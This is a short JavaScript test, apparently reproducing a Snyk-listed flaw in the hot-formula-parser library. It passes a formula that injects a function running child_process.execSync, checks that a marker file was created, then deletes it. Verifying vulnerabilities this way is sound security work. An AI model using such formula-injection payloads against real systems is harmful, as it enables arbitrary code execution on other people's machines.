//https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328
test("Arbitrary code execution in hot-formula-parser", () => {
  const fs = require("fs");
  const FormulaParser = require("hot-formula-parser").Parser;
  const path = "./hot-formula-parser";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let parser = new FormulaParser();
    parser.parse(
      "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
    );
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
